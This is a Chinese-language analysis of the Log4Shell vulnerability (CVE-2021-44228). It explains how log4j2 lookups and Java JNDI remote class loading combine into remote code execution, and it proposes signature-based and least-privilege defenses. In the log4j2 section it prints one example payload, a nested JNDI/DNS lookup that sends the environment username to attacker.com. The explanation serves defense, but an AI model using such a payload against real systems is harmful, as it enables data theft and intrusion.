Log4Shell (CVE-2021-44228)风险分析与防护机制


该漏洞基本上分为两部分：log4j2 部分（允许通过特殊构造的可记录字符串引诱使用该组件的 Java 程序访问攻击者指定的 URI）和 Java 核心部分（允许不经检查地执行服务器响应中引用的 Java 代码），以下将分别对这两部分进行分析。


log4j2 部分


首先，log4j2 引入一个特殊语法（属性替换） `${prefix:name}`，当输入的日志中包含匹配该表达式的内容时，将会对 `name` 按照 `prefix` 指定的方式求值，最后将该表达式替换成求得的值写入输出日志中，且该语法可以嵌套。


其次，在 LOG4J2-313 后添加了如下功能：当 `prefix` 为 `jndi` 时，求值方式为使用 JNDI（Java 命名和目录接口）功能查找 `name`，并返回查找结果（一开始只支持 LDAP(s) 协议向远程服务器查找，但不排除此后添加了对其他协议的支持）。如 `name` 不包含冒号，则自动添加前缀 `java:comp/env/` 后查找，否则直接查找。因此当 `name` 是一个 JNDI 支持的完整的 URI （如 ldap URI ldap://example.com/a ）时，将使得 log4j2 通过 JNDI 直接访问该 URI。


值得注意的是，只要输入的日志包含表达式 `${prefix:name}`，log4j2 便会对该表达式求值，而不管该表达式出现在输入日志的什么位置，这意味着攻击者只要能以任何方法让该表达式出现在输入日志中，便可在属性替换功能允许的范围内操纵 log4j2 的行为；而当 LOG4J2-313 将 JNDI 引入属性替换功能之后，更可以操纵 log4j2 访问攻击者指定的 URI，而仅仅如此便足以构造 DoS 类型的攻击，或通过对嵌套的属性替换表达式求值以在操纵 log4j2 访问攻击者指定的服务器（如可通过表达式 `${jndi:dns://${env:USERNAME}@.attacker.com}}`

使目标向攻击者指定的 DNS 服务器attacker.com 查询对 `${env:USERNAME}` 求值的结果，以将该参数带出来）时通过请求获取攻击目标的参数。


Java 部分

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf


使事态进一步恶化的是，Java 允许在 JNDI 使用的目录服务中存储 Java 对象（串行化为二进制数据块），但因为 Java 对象并不总是能串行化或不适合串行化，JNDI 还引入了名称引用：


* 引用地址：以 rmi 协议指定的对象地址（如 rmi://server/ref ），由选项 Java.rmi.server.useCodebaseOnly = false 启用，该配置自 JDK 7u21 开始默认为 true，即默认禁用通过 RMI 协议加载远程对象，仅可使用下述的代码基础。

* 远程工厂：一个可供初始化此类对象的 Java 类的位置，包括：类名和代码基础（Codebase，作为工厂类的 Java 类文件的位置，如 com.sun.jndi.ldap.object.trustURLCodebase = true 则可为 URI，否则只能为本地文件系统中的类文件）。


如果代码基础可以为 URI，攻击者可以直接提供恶意的工厂类文件，通过其构造函数实现远程执行代码；否则，攻击者可以提供一段串行化的对象，并以攻击目标上的 classpath 中的某个类作为工厂类来初始化的方式实现面向返回的编程。


改进建议

log4j2 部分

属性替换功能原本的设计意图似乎是为了在配置文件中使用，但因为设计失误，其实现方式为先把表达式插入某个处理阶段的日志中，再统一进行求值，结果使得原本在输入日志中出现的“表达式”也会被求值。因此局部的改进建议便是将表达式求值的作用范围限制于配置文件，而至少用选项来控制对输入日志中出现的“表达式”的求值（目前 apache 的修复似乎走的正是这条路线）。


Java 部分：基于密码学签名的RCE友好生态

更严重的问题在 Java 本身，如官方文档所言，Java 在很多地方允许动态（甚至从远程）加载代码，而不做任何信任限制。所以解决这个问题的根本方法在于为 Java 加载远程代码和串行化的对象施加信任限制。


JAR 包有现成的签名机制可用。但对单独的 Java 类文件尚无签名机制，不过幸好 Java 类数据结构的结尾还比较易于确定，因此可以直接将数字签名附于 Java 类数据结构之后，从而扩展为“带数字签名的 Java 类文件”格式，且带数字签名的 Java 类文件可以像普通的 Java 类文件一样加载而直接忽略后面的数字签名，但添加用于禁止加载执行未附带可信数字签名的 Java 类文件的机制，并适当编纂策略，如禁止执行来自远程的未签名的 Java 类文件。


对于串行化对象也可以添加签名机制，包括对实时生成的串流和预先生成的数据块添加和去除签名、以及验签的功能（实际上不影响串流内部构造，相当于为任何有限长的数据流添加签名），并适当编纂策略，如禁止解码来自远程的、未签名的串行化对象。


以上功能都可以像 log4j-jndi-be-gone 那样，作为一个 Java agent 实现，以扩展 JVM 的功能；对串行化对象的签名处理则可通过串行化过滤器来实现。既然Java的企业应用生态中“RCE不是一个bug而是一个feature”，那这种方法可以长期的解决这个安全隐患。


开发者和运维

据赛博堡垒得到的情况，CVE-2021-44228并未影响到一些计算节点，而这些节点并非属于高级威胁防护类别，只是简单的做了：


* 使用原生实现Java.util.logging替代第三方库

* 使用rsyslogd进行统一日志管理


企业应用的开发者和用户可以参考此类方案。


系统层防护应该至少做些什么？

最小权限，即禁止Java应用运行于高权限，即使出现RCE，攻击者也需要进一步获取内核权限才能达到目的。虽然RBAC/MAC/seccomp这类非标准化的防护可以极大的增强防护能力，但其成本并非普通计算节点可承受。


高级威胁防护的额外关注点

CVE-2021-44228对于准备考虑部分高级威胁防护的机构来说有一个启示作用，即业界认为只要运行少量web服务，除了RCE不需要考虑本地攻击，但实际上RCE之后的攻击路径可以通过内核提权继而打击更底层的计算组件（比如固件），堡垒悖论对于部分场景依然需要纳入威胁模型。另外，高级威胁的职业玩家可以借着CVE-2021-44228这类由众多玩家（包括脚本小子在内）参与的exploit-in-the-wild的攻击作为掩护，进而针对高价值目标进行定向打击。


是否应该抱怨开源维护者？开源基金会是否是唯一解决方案？

OpenSSL的心脏出血后Linux基金会成立了CII基础架构联盟以解决开源基础架构的安全生态问题，但其结果不尽人意，比如manager的人数超过maintainer，未来CVE-2021-44228这类问题会有更多曝光，但解决的思路如果仅仅是找一个机构（不论是基金会还是监管部门或者是大厂商），那这个机构的判断正确与否都等同于是把鸡蛋放进同一个篮子。介于开源社区多样性自底向上的进化模式占比很高的情况，赛博堡垒对开源项目的建议是：谁用谁负责，谁用谁审计，谁用谁加固。
